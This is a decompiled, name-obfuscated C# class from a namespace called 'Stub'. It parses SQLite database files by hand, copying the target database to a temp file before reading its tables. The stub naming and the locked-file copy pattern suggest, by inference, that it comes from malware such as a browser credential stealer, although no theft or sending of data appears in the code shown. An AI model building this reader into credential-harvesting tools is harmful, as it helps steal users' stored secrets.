using System;
using System.IO;
using System.Text;

namespace Stub
{
	// Token: 0x0200001F RID: 31
	public class Class27
	{
		// Token: 0x06000058 RID: 88 RVA: 0x00003E48 File Offset: 0x00002048
		public Class27(string String_1)
		{
			this.byte_1 = File.ReadAllBytes(String_1);
			this.ulong_1 = this.method_5(16, 2);
			this.ulong_0 = this.method_5(56, 4);
			this.method_3(100L);
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003EA8 File Offset: 0x000020A8
		public string method_0(int int_0, int int_1)
		{
			string result;
			try
			{
				if (int_0 >= this.struct11_0.Length)
				{
					result = null;
				}
				else
				{
					result = ((int_1 >= this.struct11_0[int_0].String_0.Length) ? null : this.struct11_0[int_0].String_0[int_1]);
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00002172 File Offset: 0x00000372
		public int method_1()
		{
			return this.struct11_0.Length;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00003F10 File Offset: 0x00002110
		public bool method_2(ulong ulong_2)
		{
			bool result;
			try
			{
				if (this.byte_1[(int)(checked((IntPtr)ulong_2))] == 13)
				{
					uint num = (uint)(this.method_5((int)ulong_2 + 3, 2) - 1UL);
					int num2 = 0;
					if (this.struct11_0 != null)
					{
						num2 = this.struct11_0.Length;
						Array.Resize<Class27.Struct11>(ref this.struct11_0, this.struct11_0.Length + (int)num + 1);
					}
					else
					{
						this.struct11_0 = new Class27.Struct11[num + 1U];
					}
					for (uint num3 = 0U; num3 <= num; num3 += 1U)
					{
						ulong num4 = this.method_5((int)ulong_2 + 8 + (int)(num3 * 2U), 2);
						if (ulong_2 != 100UL)
						{
							num4 += ulong_2;
						}
						int num5 = this.method_6((int)num4);
						this.method_7((int)num4, num5);
						int num6 = this.method_6((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
						this.method_7((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
						ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
						int num8 = this.method_6((int)num7);
						int num9 = num8;
						long num10 = this.method_7((int)num7, num8);
						Class27.Struct10[] array = null;
						long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
						int num12 = 0;
						while (num11 < num10)
						{
							Array.Resize<Class27.Struct10>(ref array, num12 + 1);
							int num13 = num9 + 1;
							num9 = this.method_6(num13);
							array[num12].long_1 = this.method_7(num13, num9);
							array[num12].long_0 = (long)((array[num12].long_1 <= 9L) ? ((ulong)this.byte_0[(int)(checked((IntPtr)array[num12].long_1))]) : ((ulong)((!Class27.smethod_0(array[num12].long_1)) ? ((array[num12].long_1 - 12L) / 2L) : ((array[num12].long_1 - 13L) / 2L))));
							num11 = num11 + (long)(num9 - num13) + 1L;
							num12++;
						}
						if (array != null)
						{
							this.struct11_0[num2 + (int)num3].String_0 = new string[array.Length];
							int num14 = 0;
							for (int i = 0; i <= array.Length - 1; i++)
							{
								if (array[i].long_1 > 9L)
								{
									if (!Class27.smethod_0(array[i].long_1))
									{
										if (this.ulong_0 == 1UL)
										{
											this.struct11_0[num2 + (int)num3].String_0[i] = Encoding.Default.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].long_0);
										}
										else if (this.ulong_0 == 2UL)
										{
											this.struct11_0[num2 + (int)num3].String_0[i] = Encoding.Unicode.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].long_0);
										}
										else if (this.ulong_0 == 3UL)
										{
											this.struct11_0[num2 + (int)num3].String_0[i] = Encoding.BigEndianUnicode.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].long_0);
										}
									}
									else
									{
										this.struct11_0[num2 + (int)num3].String_0[i] = Encoding.Default.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].long_0);
									}
								}
								else
								{
									this.struct11_0[num2 + (int)num3].String_0[i] = Convert.ToString(this.method_5((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].long_0));
								}
								num14 += (int)array[i].long_0;
							}
						}
					}
				}
				else if (this.byte_1[(int)(checked((IntPtr)ulong_2))] == 5)
				{
					uint num15 = (uint)(this.method_5((int)(ulong_2 + 3UL), 2) - 1UL);
					for (uint num16 = 0U; num16 <= num15; num16 += 1U)
					{
						uint num17 = (uint)this.method_5((int)ulong_2 + 12 + (int)(num16 * 2U), 2);
						this.method_2((this.method_5((int)(ulong_2 + (ulong)num17), 4) - 1UL) * this.ulong_1);
					}
					this.method_2((this.method_5((int)(ulong_2 + 8UL), 4) - 1UL) * this.ulong_1);
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600005C RID: 92 RVA: 0x0000437C File Offset: 0x0000257C
		public void method_3(long long_0)
		{
			try
			{
				byte b = this.byte_1[(int)(checked((IntPtr)long_0))];
				if (b != 5)
				{
					if (b == 13)
					{
						ulong num = this.method_5((int)long_0 + 3, 2) - 1UL;
						int num2 = 0;
						if (this.struct12_0 != null)
						{
							num2 = this.struct12_0.Length;
							Array.Resize<Class27.Struct12>(ref this.struct12_0, this.struct12_0.Length + (int)num + 1);
						}
						else
						{
							this.struct12_0 = new Class27.Struct12[num + 1UL];
						}
						for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
						{
							ulong num4 = this.method_5((int)long_0 + 8 + (int)num3 * 2, 2);
							if (long_0 != 100L)
							{
								num4 += (ulong)long_0;
							}
							int num5 = this.method_6((int)num4);
							this.method_7((int)num4, num5);
							int num6 = this.method_6((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
							this.method_7((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
							ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
							int num8 = this.method_6((int)num7);
							int num9 = num8;
							long num10 = this.method_7((int)num7, num8);
							long[] array = new long[5];
							for (int i = 0; i <= 4; i++)
							{
								int int_ = num9 + 1;
								num9 = this.method_6(int_);
								array[i] = this.method_7(int_, num9);
								array[i] = (long)((array[i] <= 9L) ? ((ulong)this.byte_0[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!Class27.smethod_0(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
							}
							if (this.ulong_0 == 1UL || this.ulong_0 == 2UL)
							{
								if (this.ulong_0 == 1UL)
								{
									this.struct12_0[num2 + (int)num3].String_0 = Encoding.Default.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
								}
								else if (this.ulong_0 == 2UL)
								{
									this.struct12_0[num2 + (int)num3].String_0 = Encoding.Unicode.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
								}
								else if (this.ulong_0 == 3UL)
								{
									this.struct12_0[num2 + (int)num3].String_0 = Encoding.BigEndianUnicode.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
								}
							}
							this.struct12_0[num2 + (int)num3].long_0 = (long)this.method_5((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
							if (this.ulong_0 == 1UL)
							{
								this.struct12_0[num2 + (int)num3].String_1 = Encoding.Default.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
							else if (this.ulong_0 == 2UL)
							{
								this.struct12_0[num2 + (int)num3].String_1 = Encoding.Unicode.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
							else if (this.ulong_0 == 3UL)
							{
								this.struct12_0[num2 + (int)num3].String_1 = Encoding.BigEndianUnicode.GetString(this.byte_1, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
						}
					}
				}
				else
				{
					uint num11 = (uint)(this.method_5((int)long_0 + 3, 2) - 1UL);
					for (int j = 0; j <= (int)num11; j++)
					{
						uint num12 = (uint)this.method_5((int)long_0 + 12 + j * 2, 2);
						if (long_0 == 100L)
						{
							this.method_3((long)((this.method_5((int)num12, 4) - 1UL) * this.ulong_1));
						}
						else
						{
							this.method_3((long)((this.method_5((int)(long_0 + (long)((ulong)num12)), 4) - 1UL) * this.ulong_1));
						}
					}
					this.method_3((long)((this.method_5((int)long_0 + 8, 4) - 1UL) * this.ulong_1));
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000047B8 File Offset: 0x000029B8
		public bool method_4(string String_1)
		{
			bool result;
			try
			{
				int num = -1;
				for (int i = 0; i <= this.struct12_0.Length; i++)
				{
					if (string.Compare(this.struct12_0[i].String_0.ToLower(), String_1.ToLower(), StringComparison.Ordinal) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					result = false;
				}
				else
				{
					string[] array = this.struct12_0[num].String_1.Substring(this.struct12_0[num].String_1.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
					{
						','
					});
					for (int j = 0; j <= array.Length - 1; j++)
					{
						array[j] = array[j].TrimStart(new char[0]);
						int num2 = array[j].IndexOf(' ');
						if (num2 > 0)
						{
							array[j] = array[j].Substring(0, num2);
						}
						if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
						{
							Array.Resize<string>(ref this.String_0, j + 1);
							this.String_0[j] = array[j];
						}
					}
					result = this.method_2((ulong)((this.struct12_0[num].long_0 - 1L) * (long)this.ulong_1));
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00004910 File Offset: 0x00002B10
		public ulong method_5(int int_0, int int_1)
		{
			ulong result;
			try
			{
				if (int_1 > 8 || int_1 == 0)
				{
					result = 0UL;
				}
				else
				{
					ulong num = 0UL;
					for (int i = 0; i <= int_1 - 1; i++)
					{
						num = (num << 8 | (ulong)this.byte_1[int_0 + i]);
					}
					result = num;
				}
			}
			catch
			{
				result = 0UL;
			}
			return result;
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00004968 File Offset: 0x00002B68
		public int method_6(int int_0)
		{
			int result;
			try
			{
				if (int_0 > this.byte_1.Length)
				{
					result = 0;
				}
				else
				{
					for (int i = int_0; i <= int_0 + 8; i++)
					{
						if (i > this.byte_1.Length - 1)
						{
							return 0;
						}
						if ((this.byte_1[i] & 128) != 128)
						{
							return i;
						}
					}
					result = int_0 + 8;
				}
			}
			catch
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000049D8 File Offset: 0x00002BD8
		public long method_7(int int_0, int int_1)
		{
			long result;
			try
			{
				int_1++;
				byte[] array = new byte[8];
				int num = int_1 - int_0;
				bool flag = false;
				if (num == 0 || num > 9)
				{
					result = 0L;
				}
				else if (num != 1)
				{
					if (num == 9)
					{
						flag = true;
					}
					int num2 = 1;
					int num3 = 7;
					int num4 = 0;
					if (flag)
					{
						array[0] = this.byte_1[int_1 - 1];
						int_1--;
						num4 = 1;
					}
					for (int i = int_1 - 1; i >= int_0; i += -1)
					{
						if (i - 1 >= int_0)
						{
							array[num4] = (byte)((this.byte_1[i] >> num2 - 1 & 255 >> num2) | (int)this.byte_1[i - 1] << num3);
							num2++;
							num4++;
							num3--;
						}
						else if (!flag)
						{
							array[num4] = (byte)(this.byte_1[i] >> num2 - 1 & 255 >> num2);
						}
					}
					result = BitConverter.ToInt64(array, 0);
				}
				else
				{
					array[0] = (this.byte_1[int_0] & 127);
					result = BitConverter.ToInt64(array, 0);
				}
			}
			catch
			{
				result = 0L;
			}
			return result;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x0000217C File Offset: 0x0000037C
		public static bool smethod_0(long long_0)
		{
			return (long_0 & 1L) == 1L;
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00004AF8 File Offset: 0x00002CF8
		public static Class27 smethod_1(string String_1, string String_2)
		{
			if (!File.Exists(String_1))
			{
				return null;
			}
			string text = Path.GetTempFileName() + ".tmpdb";
			File.Copy(String_1, text);
			Class27 @class = new Class27(text);
			@class.method_4(String_2);
			File.Delete(text);
			if (@class.method_1() == 65536)
			{
				return null;
			}
			return @class;
		}

		// Token: 0x04000019 RID: 25
		public readonly byte[] byte_0 = new byte[]
		{
			0,
			1,
			2,
			3,
			4,
			6,
			8,
			8,
			0,
			0
		};

		// Token: 0x0400001A RID: 26
		public readonly ulong ulong_0;

		// Token: 0x0400001B RID: 27
		public readonly byte[] byte_1;

		// Token: 0x0400001C RID: 28
		public readonly ulong ulong_1;

		// Token: 0x0400001D RID: 29
		public string[] String_0;

		// Token: 0x0400001E RID: 30
		private Class27.Struct12[] struct12_0;

		// Token: 0x0400001F RID: 31
		private Class27.Struct11[] struct11_0;

		// Token: 0x02000020 RID: 32
		private struct Struct10
		{
			// Token: 0x04000020 RID: 32
			public long long_0;

			// Token: 0x04000021 RID: 33
			public long long_1;
		}

		// Token: 0x02000021 RID: 33
		private struct Struct11
		{
			// Token: 0x04000022 RID: 34
			public string[] String_0;
		}

		// Token: 0x02000022 RID: 34
		private struct Struct12
		{
			// Token: 0x04000023 RID: 35
			public string String_0;

			// Token: 0x04000024 RID: 36
			public long long_0;

			// Token: 0x04000025 RID: 37
			public string String_1;
		}
	}
}
